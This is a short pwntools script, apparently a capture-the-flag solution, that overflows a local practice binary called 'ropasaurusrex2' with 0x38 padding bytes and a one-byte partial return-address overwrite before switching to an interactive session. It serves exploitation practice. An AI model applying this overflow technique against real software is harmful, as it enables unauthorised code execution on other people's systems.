from pwn import *

r=process("./ropasaurusrex2")
context.log_level='debug'
pay='x'*0x38
pay+='\x16'

r.send(pay)
r.interactive()
